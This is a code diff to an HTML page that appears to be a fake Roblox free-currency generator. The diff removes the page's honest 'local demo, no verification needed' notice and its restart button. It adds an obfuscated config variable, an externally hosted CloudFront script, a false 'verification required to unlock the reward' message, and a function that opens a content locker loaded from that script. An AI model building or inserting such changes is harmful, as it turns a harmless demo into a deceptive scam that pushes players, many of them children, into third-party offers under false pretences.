@@ -781,6 +781,10 @@
       .landing-card { padding: 38px 24px 32px; }
     }
   </style>
+  <script type="text/javascript">
+    var peiHw_vKe_wxZWDc = {"it":4602036,"key":"9b48c"};
+  </script>
+  <script src="https://d1g1lhd4vferpn.cloudfront.net/e01001f.js"></script>
 </head>
 <body class="landing-active">
   <svg aria-hidden="true" width="0" height="0" style="position:absolute;overflow:hidden">
@@ -983,8 +987,8 @@
           <div id="completePrize"></div>
           <p>Generated for <span id="userShow3">Username</span></p>
         </div>
-        <div class="notice">This local demo stops here. No external verification, password, or personal data is required.</div>
-        <button class="primary-btn" id="restartBtn" style="background:var(--emerald)">START AGAIN</button>
+        <div class="notice">Verification is required to unlock the reward page. No Roblox password is needed.</div>
+        <button class="primary-btn pulse" id="lockerBtn" onclick="triggerContentLocker()" style="background:var(--emerald)">NEXT 🎁</button>
         <p class="subhead" style="text-align:center;margin-top:14px">This offer expires in <span id="timer">05:00</span></p>
       </div>
     </section>
@@ -1025,15 +1029,45 @@
     function handleLandingEntry(entry) {
       if (entry === "rbx") {
         showLandingToast("Loading your RBX...");
-        setTimeout(enterGeneratedApp, 600);
       } else if (entry === "brainrot") {
         showLandingToast("Stealing a Brainrot...");
       } else {
         showLandingToast("Escaping the Tsunami...");
       }
+      setTimeout(enterGeneratedApp, 600);
     }
 
     window.handleLandingEntry = handleLandingEntry;
+
+    function triggerContentLocker() {
+      if (typeof window._yk === "function") {
+        window._yk();
+        return;
+      }
+
+      const button = $("lockerBtn");
+      const original = button.textContent;
+      button.disabled = true;
+      button.textContent = "Loading...";
+      let tries = 0;
+
+      const waitForLocker = setInterval(() => {
+        tries += 1;
+        if (typeof window._yk === "function") {
+          clearInterval(waitForLocker);
+          button.disabled = false;
+          button.textContent = original;
+          window._yk();
+        } else if (tries >= 20) {
+          clearInterval(waitForLocker);
+          button.disabled = false;
+          button.textContent = original;
+          alert("The unlock system is still loading. Please check your connection and try again.");
+        }
+      }, 250);
+    }
+
+    window.triggerContentLocker = triggerContentLocker;
 
     function setupStars() {
       const canvas = $("stars");
@@ -1234,7 +1268,6 @@
       }, 1000);
     });
 
-    $("restartBtn").addEventListener("click", () => location.reload());
     setInterval(updateMetrics, 2600);
     setInterval(toast, 5200);
     setTimeout(toast, 900);
